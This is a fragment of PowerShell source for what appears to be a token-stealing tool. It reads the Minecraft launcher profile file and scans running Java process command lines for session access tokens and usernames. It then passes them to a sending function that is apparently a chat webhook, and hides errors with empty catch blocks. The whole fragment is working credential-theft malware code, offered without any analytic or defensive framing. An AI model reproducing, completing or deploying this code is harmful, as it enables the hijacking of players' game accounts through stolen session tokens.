function gtMinecraft {
    $p="C:\Users\$env:USERNAME\AppData\Roaming\.minecraft\launcher_profiles.json"
    if(Test-Path $p){
        try{
            $d=Get-Content $p -Raw|ConvertFrom-Json
            $t=$d.accessToken
            $u=$d.selectedProfile.name
            if($t){snd "**[MC SESSION]**`n```$t```";if($u){snd "**[MC USER]**`n$u`nhttps://mc-heads.net/avatar/$u/64";gtStats $u}}
        }catch{}
    }
}

function gtJava {
    try{
        Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name='java.exe'"|%{
            $l=$_.CommandLine
            if($l -match '--accessToken\s+(\S+)' -and $l -match '--username\s+(\S+)'){
                snd "**[JAVA TOKEN - $($Matches[2])]**`n```$($Matches[1])```"
                gtStats $Matches[2]
            }
        }
    }catch{}
}

